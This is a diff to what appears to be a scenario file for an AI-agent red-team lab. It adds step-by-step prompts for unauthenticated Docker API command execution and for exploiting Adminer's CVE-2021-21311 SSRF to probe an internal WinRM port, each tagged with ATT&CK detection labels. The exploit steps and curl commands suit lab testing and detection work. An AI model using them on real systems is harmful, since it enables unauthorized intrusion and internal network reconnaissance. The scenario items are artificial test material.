+            "nothing backgrounded survives to a later call). Unlike vulhub's own documented PoC (which plants a blind "
+            "cron reverse-shell with no direct output), use the Docker API directly to RUN a command and READ its output "
+            "back via the container-logs endpoint: (a) POST to /containers/create with JSON body "
+            '{"Image":"alpine:latest","Cmd":["id"],"AttachStdout":true,"AttachStderr":true} to create a container that '
+            "runs `id`, capturing the returned container Id; (b) POST to /containers/<Id>/start to run it; (c) wait "
+            "briefly for it to finish, then GET /containers/<Id>/logs?stdout=true&stderr=true to read back the command's "
+            "real output directly from the Docker daemon's own API -- capture and print the full response body (do not "
+            "discard it), it should contain `id`'s output (e.g. uid=...(...) gid=...(...)). This IS genuine remote code "
+            "execution on the target host (the container runs on the Docker daemon you don't control) with a direct, "
+            "non-blind evidence channel. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
+        "persistence_technique": "",
+    },
+    "vuln_adminer_ssrf_recon": {
+        "name": "vuln_adminer_ssrf_recon",
+        "target_host": _LAB_WEB,
+        # New 2026-07-24, addressing a corpus-diversity gap: 83% of vuln_* scenarios
+        # carry ONLY T1190/T1059 (single-CVE web RCE demos); real technique variety
+        # (discovery, lateral movement, credential access) is almost entirely
+        # confined to the small meta3_*/mission_*/mbptl_* slice. This scenario adds
+        # T1046 (Network Service Discovery) via a real, response-reflecting SSRF:
+        # Adminer's Elasticsearch driver does file_get_contents() against an
+        # attacker-controlled host:port and reflects the raw connection result
+        # (error message OR actual remote response body) back in the page --
+        # letting an attacker already on this web app pivot to fingerprint services
+        # on hosts it cannot reach directly. Live-verified 2026-07-24: a closed port
+        # reflects "...failed to open stream: Connection refused"; the lab DC's
+        # WinRM listener (10.10.11.21:5985, a real always-up static lab host, chosen
+        # over opportunistic same-run vulhub containers for reliability) reflects an
+        # actual HTTP 404 response body from that internal-only service.
+        "vulhub_env": "adminer/CVE-2021-21311",
+        "difficulty": "easy",
+        "red_order": ["execute_bash", "execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: Adminer at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2021-21311 (SSRF via the Elasticsearch/ClickHouse driver's error page) "
+            "and use it to fingerprint an internal host you cannot reach directly. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -20' to confirm the "
+            "Adminer login page and grab a session (note: you will need the CSRF token from the login page's hidden "
+            "`token` field and a cookie jar for the next steps -- see step 3). "
+            '(2) call execute_bash with cmd=\'curl -s -m 8 -c /tmp/c.txt http://$TARGET_HOST:$TARGET_PORT/ -o /tmp/l.html; grep -o "name=.token. value=.[^\\x27\\"]*" /tmp/l.html | head -1\' to see how the token is embedded. '
+            "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
+            "backgrounded survives to a later call): GET the login page saving cookies to a file, extract the `token` "
+            "value, then POST to $TARGET_HOST:$TARGET_PORT/ with auth[driver]=elastic and auth[server] set to "
+            "10.10.11.21:5985 (the lab domain controller's WinRM port -- not directly reachable by you, but reachable "
+            "server-side from Adminer's host), following the redirect Location header with the SAME cookie jar to reach "
+            "the actual connection-attempt page. Capture and print the full response body of that final page (do not "
+            "discard it) -- it should contain a `<div class='error'>` with either the literal text of a REAL HTTP "
+            "response from the WinRM listener on the DC (proving Adminer's server made a genuine outbound connection to "
+            "an internal host you cannot reach directly -- this IS the SSRF, and the reflected content IS the proof) or "
+            "a distinct connection-level error if that port isn't reachable this run. For comparison, also try "
+            "10.10.11.21:31337 (should differ -- connection refused/timeout, since nothing listens there) to show the "
+            "SSRF distinguishes open vs closed internal ports. Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1046"],
         "persistence_technique": "",
     },
 }
